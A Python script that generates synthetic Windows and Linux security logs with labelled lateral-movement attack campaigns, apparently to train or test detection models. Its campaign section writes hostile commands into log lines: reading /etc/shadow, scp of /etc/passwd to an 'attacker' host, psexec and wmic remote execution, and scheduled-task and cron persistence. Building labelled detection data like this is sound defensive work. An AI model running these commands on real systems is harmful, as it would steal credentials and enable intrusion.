"""High-scale Windows + Linux raw synthetic log generator (1M+ events in .log format).

Generates ONLY Windows and Linux raw logs in .log files using authentic formats:
  1. data/raw/windows_security.log         (Security: 4624, 4625, 4648, 4672, 4688, 4698, 4768, 4769, 5140)
  2. data/raw/windows_powershell_cmd.log   (PowerShell/Operational 4103/4104, WinRM 6/91, CMD logs)
  3. data/raw/windows_rdp.log              (TerminalServices 1149, 21, 24)
  4. data/raw/windows_system_app.log       (System 7036/7045, Application 1000/1001/1022)
  5. data/raw/linux_auth.log               (/var/log/auth.log: sshd, sudo, pam_unix)
  6. data/raw/linux_syslog_audit.log       (/var/log/syslog & auditd: systemd, CRON, auditd EXECVE)

Also creates convenient browser-uploadable sample .log files in data/upload_samples/:
  - windows_lateral_sample.log (~12,000 events)
  - linux_lateral_sample.log   (~8,000 events)
  - combined_enterprise_sample.log (~20,000 Windows + Linux events)

Ground-truth attack windows are saved separately in data/raw/ground_truth_campaigns.csv.
"""

import argparse
from datetime import datetime, timedelta
import json
import os
import random
import sys
from typing import Any, Dict, List

import pandas as pd

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from src.config import load_config
from src.utils.logger import get_logger

logger = get_logger("generate_synthetic_logs")

CORE_USERS: Dict[str, Dict[str, Any]] = {
    "ali": {"host": "host001", "ip": "10.0.0.5", "linux_host": "linux-app01", "role": "finance"},
    "sara": {"host": "host002", "ip": "10.0.0.8", "linux_host": "linux-app02", "role": "hr"},
    "omar": {"host": "host003", "ip": "10.0.0.12", "linux_host": "linux-app03", "role": "engineering"},
    "nadia": {"host": "host004", "ip": "10.0.0.15", "linux_host": "linux-app04", "role": "engineering"},
    "bilal": {"host": "host005", "ip": "10.0.0.19", "linux_host": "linux-app05", "role": "marketing"},
    "zoya": {"host": "host006", "ip": "10.0.0.23", "linux_host": "linux-app06", "role": "support"},
    "hr_admin": {"host": "hr01", "ip": "10.0.1.10", "linux_host": "linux-hr01", "role": "hr_admin"},
    "fin_admin": {"host": "finance01", "ip": "10.0.1.11", "linux_host": "linux-fin01", "role": "fin_admin"},
    "dba_admin": {"host": "db01", "ip": "10.0.1.12", "linux_host": "linux-db01", "role": "dba"},
    "admin_ops": {"host": "dc01", "ip": "10.0.1.15", "linux_host": "linux-prod01", "role": "ops"},
    "eng_lead": {"host": "eng01", "ip": "10.0.1.20", "linux_host": "linux-prod01", "role": "eng_lead"},
}

HOST_IPS: Dict[str, str] = {
    "host001": "10.0.0.5",
    "host002": "10.0.0.8",
    "host003": "10.0.0.12",
    "host004": "10.0.0.15",
    "host005": "10.0.0.19",
    "host006": "10.0.0.23",
    "eng01": "10.0.1.20",
    "eng02": "10.0.1.21",
    "hr01": "10.0.2.10",
    "hr02": "10.0.2.11",
    "finance01": "10.0.2.20",
    "finance02": "10.0.2.21",
    "dc01": "10.0.2.5",
    "db01": "10.0.2.30",
    "linux-app01": "10.0.3.11",
    "linux-app02": "10.0.3.12",
    "linux-app03": "10.0.3.13",
    "linux-app04": "10.0.3.14",
    "linux-app05": "10.0.3.15",
    "linux-app06": "10.0.3.16",
    "linux-prod01": "10.0.4.10",
    "linux-db01": "10.0.4.20",
}

BENIGN_WIN_PROCS = [
    ("C:\\Windows\\explorer.exe", "-"),
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --profile-directory=Default"),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "outlook.exe /recycle"),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "excel.exe q4_budget.xlsx"),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "winword.exe policy_v2.docx"),
    ("C:\\Users\\Public\\Teams\\teams.exe", "teams.exe --minimized"),
    ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs"),
    ("C:\\Program Files\\Microsoft VS Code\\Code.exe", "code.exe --folder-uri file:///workspace"),
]

BENIGN_PS_SCRIPTS = [
    "Get-Date | Out-Null",
    "Get-Service wuauserv | Select-Object Status",
    "Test-Connection -ComputerName dc01 -Count 1 -Quiet",
    "Get-ChildItem C:\\Users\\Public\\Documents",
]

BENIGN_SERVICES = [
    ("Windows Update", "wuauserv", "running"),
    ("Background Intelligent Transfer Service", "BITS", "stopped"),
    ("Print Spooler", "Spooler", "running"),
    ("Windows Defender Firewall", "mpssvc", "running"),
]

BENIGN_APPS = [
    ("Application Error", 1000, "Faulting application name: EXCEL.EXE, version: 16.0.17328"),
    ("Windows Error Reporting", 1001, "Fault bucket 1948271042, type 5, Event Name: AppHangB1"),
    ("MsiInstaller", 1022, "Product: Microsoft Edge Update -- Configuration completed successfully."),
]

BENIGN_LINUX_CMDS = [
    "/usr/bin/ls -la /var/log",
    "/usr/bin/systemctl status nginx",
    "/usr/bin/cat /etc/hosts",
    "/usr/bin/tail -n 50 /var/log/syslog",
    "/usr/bin/df -h",
]

BENIGN_CRON_CMDS = [
    "/usr/sbin/logrotate /etc/logrotate.conf",
    "/usr/bin/updatedb",
    "/usr/local/bin/healthcheck.sh --quiet",
]


def _build_user_roster(num_extra: int = 109) -> List[Dict[str, Any]]:
    roster: List[Dict[str, Any]] = []
    for u, info in CORE_USERS.items():
        roster.append({"user": u, **info})
    for idx in range(1, num_extra + 1):
        host = f"ws-{idx:03d}"
        ip = f"10.0.{10 + (idx // 200)}.{10 + (idx % 200)}"
        lhost = f"linux-dev{(idx % 12) + 1:02d}"
        HOST_IPS[host] = ip
        HOST_IPS[lhost] = f"10.0.5.{10 + (idx % 12)}"
        roster.append({
            "user": f"emp{idx:03d}",
            "host": host,
            "ip": ip,
            "linux_host": lhost,
            "role": "employee",
        })
    return roster


def _win_sec_json(
    ts: datetime,
    record_id: int,
    event_id: int,
    computer: str,
    user: str,
    ip: str,
    proc: str = "-",
    cmd: str = "-",
    logon_type: int = 3,
    share_name: str = "-",
    task_name: str = "-",
) -> str:
    return json.dumps({
        "Channel": "Security",
        "ProviderName": "Microsoft-Windows-Security-Auditing",
        "EventID": event_id,
        "TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "Computer": f"{computer}.corp.local",
        "EventRecordID": record_id,
        "EventData": {
            "SubjectUserName": user,
            "TargetUserName": user,
            "TargetDomainName": "CORP",
            "LogonType": logon_type,
            "IpAddress": ip,
            "IpPort": 50000 + (record_id % 14000),
            "WorkstationName": computer,
            "NewProcessName": proc,
            "CommandLine": cmd,
            "ShareName": share_name,
            "TaskName": task_name,
        },
    })


def _win_ps_cmd_json(
    ts: datetime,
    channel: str,
    provider: str,
    event_id: int,
    computer: str,
    user: str,
    ip: str,
    script_or_cmd: str,
    host_app: str = "powershell.exe",
) -> str:
    return json.dumps({
        "Channel": channel,
        "ProviderName": provider,
        "EventID": event_id,
        "TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "Computer": f"{computer}.corp.local",
        "EventData": {
            "User": f"CORP\\{user}",
            "IpAddress": ip,
            "HostApplication": host_app,
            "ScriptBlockText": script_or_cmd,
        },
    })


def _win_rdp_json(
    ts: datetime,
    channel: str,
    provider: str,
    event_id: int,
    computer: str,
    user: str,
    src_ip: str,
    session_id: int,
) -> str:
    return json.dumps({
        "Channel": channel,
        "ProviderName": provider,
        "EventID": event_id,
        "TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "Computer": f"{computer}.corp.local",
        "EventData": {
            "Param1": f"CORP\\{user}",
            "Param2": "CORP",
            "Param3": src_ip,
            "SessionID": session_id,
            "Address": src_ip,
        },
    })


def _win_sys_app_json(
    ts: datetime,
    channel: str,
    provider: str,
    event_id: int,
    computer: str,
    user: str,
    ip: str,
    service_name: str = "-",
    image_path: str = "-",
    message: str = "-",
) -> str:
    return json.dumps({
        "Channel": channel,
        "ProviderName": provider,
        "EventID": event_id,
        "TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "Computer": f"{computer}.corp.local",
        "EventData": {
            "SubjectUserName": user,
            "IpAddress": ip,
            "ServiceName": service_name,
            "ImagePath": image_path,
            "Message": message,
        },
    })


def _linux_syslog_line(
    ts: datetime,
    host: str,
    proc: str,
    pid: int,
    message: str,
) -> str:
    return f"{ts.strftime('%b %d %H:%M:%S')} {host} {proc}[{pid}]: {message}"


def generate_raw_dataset(
    raw_dir: str,
    total_events: int = 1_050_000,
    days: int = 30,
    seed: int = 42,
    write_samples: bool = True,
) -> Dict[str, Any]:
    """Stream 1M+ legitimate Windows + Linux raw logs as .log files."""
    os.makedirs(raw_dir, exist_ok=True)
    rng = random.Random(seed)
    roster = _build_user_roster()

    # Clean up old .jsonl or legacy files so raw_dir strictly contains .log files + ground truth
    for old_name in [
        "synthetic_logs.csv",
        "sysmon_events.jsonl",
        "zeek_conn.log",
        "edr_telemetry.jsonl",
        "windows_security_events.jsonl",
        "windows_security.jsonl",
        "windows_powershell_cmd.jsonl",
        "windows_rdp.jsonl",
        "windows_system_app.jsonl",
    ]:
        old_path = os.path.join(raw_dir, old_name)
        if os.path.exists(old_path):
            os.remove(old_path)

    win_sec_path = os.path.join(raw_dir, "windows_security.log")
    win_ps_path = os.path.join(raw_dir, "windows_powershell_cmd.log")
    win_rdp_path = os.path.join(raw_dir, "windows_rdp.log")
    win_sys_path = os.path.join(raw_dir, "windows_system_app.log")
    lin_auth_path = os.path.join(raw_dir, "linux_auth.log")
    lin_sys_path = os.path.join(raw_dir, "linux_syslog_audit.log")
    gt_path = os.path.join(raw_dir, "ground_truth_campaigns.csv")

    start_dt = datetime(2025, 11, 1, 7, 0, 0)

    n_win_sec = int(total_events * 0.30)
    n_win_ps = int(total_events * 0.12)
    n_win_rdp = int(total_events * 0.08)
    n_win_sys = int(total_events * 0.12)
    n_lin_auth = int(total_events * 0.22)
    n_lin_sys = max(0, total_events - (n_win_sec + n_win_ps + n_win_rdp + n_win_sys + n_lin_auth))

    buf_sec: List[str] = []
    buf_ps: List[str] = []
    buf_rdp: List[str] = []
    buf_sys: List[str] = []
    buf_lauth: List[str] = []
    buf_lsys: List[str] = []
    flush_size = 20_000

    def _random_workday_ts() -> datetime:
        day_off = rng.randint(0, max(days - 1, 0))
        hour = rng.randint(7, 17)
        minute = rng.randint(0, 59)
        sec = rng.randint(0, 59)
        return start_dt.replace(hour=hour, minute=minute, second=sec) + timedelta(days=day_off)

    with (
        open(win_sec_path, "w", encoding="utf-8", buffering=1024 * 1024) as f_sec,
        open(win_ps_path, "w", encoding="utf-8", buffering=1024 * 1024) as f_ps,
        open(win_rdp_path, "w", encoding="utf-8", buffering=1024 * 1024) as f_rdp,
        open(win_sys_path, "w", encoding="utf-8", buffering=1024 * 1024) as f_sys,
        open(lin_auth_path, "w", encoding="utf-8", buffering=1024 * 1024) as f_lauth,
        open(lin_sys_path, "w", encoding="utf-8", buffering=1024 * 1024) as f_lsys,
    ):
        win_eids = [4624, 4688, 4688, 4688, 4768, 4769, 4672]
        for i in range(n_win_sec):
            u = roster[i % len(roster)]
            ts = _random_workday_ts()
            eid = win_eids[i % len(win_eids)]
            proc_path, cmd = BENIGN_WIN_PROCS[i % len(BENIGN_WIN_PROCS)]
            if eid in (4624, 4768, 4769, 4672):
                proc_path, cmd = "C:\\Windows\\System32\\svchost.exe", "-"
            buf_sec.append(_win_sec_json(ts, 100000 + i, eid, u["host"], u["user"], u["ip"], proc_path, cmd, logon_type=2 if eid == 4624 else 3))
            if len(buf_sec) >= flush_size:
                f_sec.write("\n".join(buf_sec) + "\n")
                buf_sec.clear()

        for i in range(n_win_ps):
            u = roster[i % len(roster)]
            ts = _random_workday_ts()
            if i % 4 == 0:
                buf_ps.append(_win_ps_cmd_json(
                    ts, "Microsoft-Windows-WinRM/Operational", "Microsoft-Windows-WinRM",
                    91, u["host"], u["user"], u["ip"], "Creating WSMan shell on localhost", "winrm",
                ))
            elif i % 4 == 1:
                buf_ps.append(_win_ps_cmd_json(
                    ts, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell",
                    4103, u["host"], u["user"], u["ip"], "CommandInvocation(Get-Location): \"Get-Location\"", "powershell_ise.exe",
                ))
            else:
                script = BENIGN_PS_SCRIPTS[i % len(BENIGN_PS_SCRIPTS)]
                buf_ps.append(_win_ps_cmd_json(
                    ts, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell",
                    4104, u["host"], u["user"], u["ip"], script, "powershell_ise.exe",
                ))
            if len(buf_ps) >= flush_size:
                f_ps.write("\n".join(buf_ps) + "\n")
                buf_ps.clear()

        for i in range(n_win_rdp):
            u = roster[i % len(roster)]
            ts = _random_workday_ts()
            mod = i % 3
            if mod == 0:
                buf_rdp.append(_win_rdp_json(
                    ts, "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational",
                    "Microsoft-Windows-TerminalServices-RemoteConnectionManager",
                    1149, u["host"], u["user"], u["ip"], 2 + (i % 10),
                ))
            elif mod == 1:
                buf_rdp.append(_win_rdp_json(
                    ts, "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
                    "Microsoft-Windows-TerminalServices-LocalSessionManager",
                    21, u["host"], u["user"], u["ip"], 2 + (i % 10),
                ))
            else:
                buf_rdp.append(_win_rdp_json(
                    ts, "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
                    "Microsoft-Windows-TerminalServices-LocalSessionManager",
                    24, u["host"], u["user"], u["ip"], 2 + (i % 10),
                ))
            if len(buf_rdp) >= flush_size:
                f_rdp.write("\n".join(buf_rdp) + "\n")
                buf_rdp.clear()

        for i in range(n_win_sys):
            u = roster[i % len(roster)]
            ts = _random_workday_ts()
            if i % 2 == 0:
                svc_disp, svc_name, state = BENIGN_SERVICES[i % len(BENIGN_SERVICES)]
                buf_sys.append(_win_sys_app_json(
                    ts, "System", "Service Control Manager", 7036,
                    u["host"], u["user"], u["ip"], svc_name, "-",
                    f"The {svc_disp} service entered the {state} state.",
                ))
            else:
                prov, eid, msg = BENIGN_APPS[i % len(BENIGN_APPS)]
                buf_sys.append(_win_sys_app_json(
                    ts, "Application", prov, eid,
                    u["host"], u["user"], u["ip"], "-", "-", msg,
                ))
            if len(buf_sys) >= flush_size:
                f_sys.write("\n".join(buf_sys) + "\n")
                buf_sys.clear()

        for i in range(n_lin_auth):
            u = roster[i % len(roster)]
            ts = _random_workday_ts()
            pid = 1000 + (i % 25000)
            mod = i % 10
            if mod < 7:
                msg = f"Accepted publickey for {u['user']} from {u['ip']} port {40000 + (i % 20000)} ssh2: RSA SHA256:corpkey"
                buf_lauth.append(_linux_syslog_line(ts, u["linux_host"], "sshd", pid, msg))
            elif mod < 9:
                cmd = BENIGN_LINUX_CMDS[i % len(BENIGN_LINUX_CMDS)]
                msg = f"{u['user']} : TTY=pts/0 ; PWD=/home/{u['user']} ; USER=root ; COMMAND={cmd}"
                buf_lauth.append(_linux_syslog_line(ts, u["linux_host"], "sudo", pid, msg))
            else:
                msg = f"pam_unix(sshd:session): session opened for user {u['user']}(uid=100{i % 900}) by (uid=0)"
                buf_lauth.append(_linux_syslog_line(ts, u["linux_host"], "sshd", pid, msg))
            if len(buf_lauth) >= flush_size:
                f_lauth.write("\n".join(buf_lauth) + "\n")
                buf_lauth.clear()

        for i in range(n_lin_sys):
            u = roster[i % len(roster)]
            ts = _random_workday_ts()
            pid = 3000 + (i % 25000)
            mod = i % 3
            if mod == 0:
                msg = f"Started Session {100 + (i % 900)} of user {u['user']}."
                buf_lsys.append(_linux_syslog_line(ts, u["linux_host"], "systemd", pid, msg))
            elif mod == 1:
                cron_cmd = BENIGN_CRON_CMDS[i % len(BENIGN_CRON_CMDS)]
                msg = f"({u['user']}) CMD ({cron_cmd})"
                buf_lsys.append(_linux_syslog_line(ts, u["linux_host"], "CRON", pid, msg))
            else:
                cmd = BENIGN_LINUX_CMDS[i % len(BENIGN_LINUX_CMDS)]
                msg = f"type=EXECVE user={u['user']} src={u['ip']} comm=\"{cmd.split()[0]}\" cmdline=\"{cmd}\""
                buf_lsys.append(_linux_syslog_line(ts, u["linux_host"], "auditd", pid, msg))
            if len(buf_lsys) >= flush_size:
                f_lsys.write("\n".join(buf_lsys) + "\n")
                buf_lsys.clear()

        # Place campaigns across the latter portion of the timeline (last 30% of days)
        # so a chronological 70/30 Train/Test split places baseline in Train and attacks in Test!
        test_start_day = max(1, int(days * 0.72))
        campaigns = [
            ("camp_01_ali_offhours_smb_psexec", "ali", "host001", "192.168.50.77", ["hr01", "hr02", "dc01"], 0, 2, False),
            ("camp_02_sara_finance_db_pivot", "sara", "host002", "10.0.0.8", ["finance01", "finance02", "db01"], 1, 14, False),
            ("camp_03_omar_spray_schtasks_linux", "omar", "host003", "172.16.8.99", ["finance01", "db01", "linux-prod01"], 2, 22, True),
            ("camp_04_bilal_recon_wmi_rdp", "bilal", "host005", "10.0.0.19", ["hr01", "dc01"], 3, 11, False),
            ("camp_05_nadia_ssh_linux_pivot", "nadia", "host004", "185.220.101.4", ["linux-prod01", "linux-db01", "db01"], 4, 3, True),
            ("camp_06_zoya_kerberoast_rdp", "zoya", "host006", "10.0.0.23", ["finance01", "hr02", "dc01"], 5, 19, False),
            ("camp_07_emp012_admin_share_sweep", "emp012", "ws-012", "198.51.100.44", ["hr01", "finance01", "db01"], 6, 1, False),
            ("camp_08_emp045_winrm_powershell", "emp045", "ws-045", "10.0.10.55", ["finance02", "dc01", "linux-db01"], 7, 23, True),
            ("camp_09_emp077_ssh_bruteforce_sudo", "emp077", "ws-077", "203.0.113.88", ["linux-prod01", "linux-db01"], 7, 4, True),
            ("camp_10_ali_rdp_service_staging", "ali", "host001", "192.168.99.15", ["hr01", "db01", "dc01"], 8, 21, True),
        ]

        gt_rows: List[Dict[str, Any]] = []
        rec_seq = 900_000_000
        for camp_name, user, init_host, att_ip, targets, rel_d, hr, has_linux in campaigns:
            d_off = min(days - 1, test_start_day + rel_d % max(1, days - test_start_day))
            base_ts = start_dt.replace(hour=hr, minute=10, second=0) + timedelta(days=d_off)
            init_ip = HOST_IPS.get(init_host, "10.0.0.5")

            for k in range(4):
                ev_ts = base_ts + timedelta(seconds=k * 15)
                buf_sec.append(_win_sec_json(ev_ts, rec_seq, 4625, init_host, user, att_ip, logon_type=10))
                rec_seq += 1
                if has_linux:
                    buf_lauth.append(_linux_syslog_line(ev_ts, "linux-app03", "sshd", 9000 + k, f"Failed password for {user} from {att_ip} port {55000 + k} ssh2"))

            comp_ts = base_ts + timedelta(minutes=1, seconds=10)
            buf_sec.append(_win_sec_json(comp_ts, rec_seq, 4624, init_host, user, att_ip, "C:\\Windows\\explorer.exe", "-", logon_type=10))
            rec_seq += 1
            buf_sec.append(_win_sec_json(comp_ts + timedelta(seconds=5), rec_seq, 4672, init_host, user, att_ip))
            rec_seq += 1
            buf_rdp.append(_win_rdp_json(
                comp_ts + timedelta(seconds=8),
                "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational",
                "Microsoft-Windows-TerminalServices-RemoteConnectionManager",
                1149, init_host, user, att_ip, 99,
            ))
            buf_ps.append(_win_ps_cmd_json(
                comp_ts + timedelta(seconds=20),
                "Microsoft-Windows-PowerShell/Operational",
                "Microsoft-Windows-PowerShell",
                4104, init_host, user, att_ip,
                f"Invoke-Command -ComputerName {targets[0]} -ScriptBlock {{whoami; net user /domain}}",
                "powershell.exe",
            ))

            for idx_t, tgt in enumerate(targets):
                hop_ts = base_ts + timedelta(minutes=2 + idx_t * 2)
                if tgt.startswith("linux-"):
                    buf_lauth.append(_linux_syslog_line(hop_ts, tgt, "sshd", 9500 + idx_t, f"Accepted password for {user} from {init_ip} port {58000 + idx_t} ssh2"))
                    buf_lauth.append(_linux_syslog_line(hop_ts + timedelta(seconds=15), tgt, "sudo", 9510 + idx_t, f"{user} : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"))
                    buf_lsys.append(_linux_syslog_line(hop_ts + timedelta(seconds=25), tgt, "auditd", 9520 + idx_t, f"type=EXECVE user={user} src={init_ip} comm=\"scp\" cmdline=\"scp /etc/passwd attacker@{att_ip}:/tmp/\""))
                    buf_lsys.append(_linux_syslog_line(hop_ts + timedelta(seconds=35), tgt, "CRON", 9530 + idx_t, f"({user}) CMD (/tmp/.persist.sh)"))
                else:
                    buf_sec.append(_win_sec_json(hop_ts, rec_seq, 4624, tgt, user, init_ip, logon_type=3))
                    rec_seq += 1
                    buf_sec.append(_win_sec_json(hop_ts + timedelta(seconds=10), rec_seq, 5140, tgt, user, init_ip, share_name=f"\\\\{tgt}\\C$"))
                    rec_seq += 1
                    buf_rdp.append(_win_rdp_json(
                        hop_ts + timedelta(seconds=12),
                        "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
                        "Microsoft-Windows-TerminalServices-LocalSessionManager",
                        21, tgt, user, init_ip, 50 + idx_t,
                    ))
                    tool = "psexec.exe" if idx_t % 2 == 0 else "wmic.exe"
                    cmd = f"cmd.exe /c net use \\\\{tgt}\\ADMIN$ && psexec \\\\{tgt} -s cmd.exe" if tool == "psexec.exe" else f"wmic /node:{tgt} process call create powershell.exe"
                    buf_sec.append(_win_sec_json(hop_ts + timedelta(seconds=20), rec_seq, 4688, tgt, user, init_ip, f"C:\\Windows\\System32\\{tool}", cmd))
                    rec_seq += 1
                    buf_ps.append(_win_ps_cmd_json(
                        hop_ts + timedelta(seconds=22),
                        "Microsoft-Windows-WinRM/Operational",
                        "Microsoft-Windows-WinRM",
                        6, tgt, user, init_ip, cmd, tool,
                    ))
                    if idx_t == 0:
                        buf_sec.append(_win_sec_json(hop_ts + timedelta(seconds=30), rec_seq, 4698, tgt, user, init_ip, "C:\\Windows\\System32\\schtasks.exe", f"schtasks /create /s {tgt} /tn SysUpdater /tr cmd.exe", task_name="\\SysUpdater"))
                        rec_seq += 1
                        buf_sys.append(_win_sys_app_json(
                            hop_ts + timedelta(seconds=35), "System", "Service Control Manager", 7045,
                            tgt, user, init_ip, "PSEXESVC", "C:\\Windows\\PSEXESVC.exe",
                            "A service was installed in the system: PSEXESVC",
                        ))

                gt_rows.append({
                    "user": user,
                    "time_window": hop_ts.replace(minute=(hop_ts.minute // 10) * 10, second=0, microsecond=0).strftime("%Y-%m-%d %H:%M:%S"),
                    "attack_scenario": camp_name,
                    "is_attack": 1,
                })
            gt_rows.append({
                "user": user,
                "time_window": comp_ts.replace(minute=(comp_ts.minute // 10) * 10, second=0, microsecond=0).strftime("%Y-%m-%d %H:%M:%S"),
                "attack_scenario": camp_name,
                "is_attack": 1,
            })

        if buf_sec:
            f_sec.write("\n".join(buf_sec) + "\n")
        if buf_ps:
            f_ps.write("\n".join(buf_ps) + "\n")
        if buf_rdp:
            f_rdp.write("\n".join(buf_rdp) + "\n")
        if buf_sys:
            f_sys.write("\n".join(buf_sys) + "\n")
        if buf_lauth:
            f_lauth.write("\n".join(buf_lauth) + "\n")
        if buf_lsys:
            f_lsys.write("\n".join(buf_lsys) + "\n")

    gt_df = pd.DataFrame(gt_rows).drop_duplicates(subset=["user", "time_window"]).reset_index(drop=True)
    gt_df.to_csv(gt_path, index=False)

    # Also generate convenient upload-ready .log files (~18k events, ~2-4 MB each) in data/upload_samples/
    if write_samples and total_events >= 20_000:
        samples_dir = os.path.join(os.path.dirname(raw_dir), "upload_samples")
        _create_convenient_upload_samples(samples_dir, seed=seed + 1)

    counts = {
        "windows_security.log": n_win_sec,
        "windows_powershell_cmd.log": n_win_ps,
        "windows_rdp.log": n_win_rdp,
        "windows_system_app.log": n_win_sys,
        "linux_auth.log": n_lin_auth,
        "linux_syslog_audit.log": n_lin_sys,
        "ground_truth_windows": len(gt_df),
    }
    logger.info("Generated %d+ Windows+Linux raw .log files in %s -> %s", total_events, raw_dir, counts)
    return counts


def _create_convenient_upload_samples(samples_dir: str, seed: int = 101) -> None:
    """Create compact, browser-upload-friendly .log files combining Windows + Linux events."""
    os.makedirs(samples_dir, exist_ok=True)
    tmp_dir = os.path.join(samples_dir, "_tmp_build")
    generate_raw_dataset(tmp_dir, total_events=18_000, days=15, seed=seed, write_samples=False)

    # 1. Combined Windows + Linux single .log file (~18k events, ~4 MB)
    combined_path = os.path.join(samples_dir, "combined_windows_linux_sample.log")
    with open(combined_path, "w", encoding="utf-8") as out_f:
        for fname in [
            "windows_security.log",
            "windows_powershell_cmd.log",
            "windows_rdp.log",
            "windows_system_app.log",
            "linux_auth.log",
            "linux_syslog_audit.log",
        ]:
            src_f = os.path.join(tmp_dir, fname)
            with open(src_f, "r", encoding="utf-8") as in_f:
                out_f.write(in_f.read())

    # 2. Separate Windows-only & Linux-only uploadable .log samples
    win_sample = os.path.join(samples_dir, "windows_all_channels_sample.log")
    with open(win_sample, "w", encoding="utf-8") as out_f:
        for fname in [
            "windows_security.log",
            "windows_powershell_cmd.log",
            "windows_rdp.log",
            "windows_system_app.log",
        ]:
            with open(os.path.join(tmp_dir, fname), "r", encoding="utf-8") as in_f:
                out_f.write(in_f.read())

    lin_sample = os.path.join(samples_dir, "linux_all_logs_sample.log")
    with open(lin_sample, "w", encoding="utf-8") as out_f:
        for fname in ["linux_auth.log", "linux_syslog_audit.log"]:
            with open(os.path.join(tmp_dir, fname), "r", encoding="utf-8") as in_f:
                out_f.write(in_f.read())

    # Preserve matching ground truth for the sample set
    gt_src = os.path.join(tmp_dir, "ground_truth_campaigns.csv")
    gt_dst = os.path.join(samples_dir, "ground_truth_samples.csv")
    if os.path.exists(gt_src):
        pd.read_csv(gt_src).to_csv(gt_dst, index=False)

    import shutil
    shutil.rmtree(tmp_dir, ignore_errors=True)
    logger.info("Created convenient uploadable .log samples in %s", samples_dir)


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate 1M+ Windows + Linux raw .log files")
    parser.add_argument("--total-events", type=int, default=1_050_000, help="Total benign events to generate (default: 1050000)")
    parser.add_argument("--days", type=int, default=30, help="Number of days to span (default: 30)")
    parser.add_argument("--seed", type=int, default=42, help="Random seed")
    args = parser.parse_args()

    cfg = load_config()
    generate_raw_dataset(
        raw_dir=cfg["paths"]["raw_dir"],
        total_events=args.total_events,
        days=args.days,
        seed=args.seed,
        write_samples=True,
    )


if __name__ == "__main__":
    main()
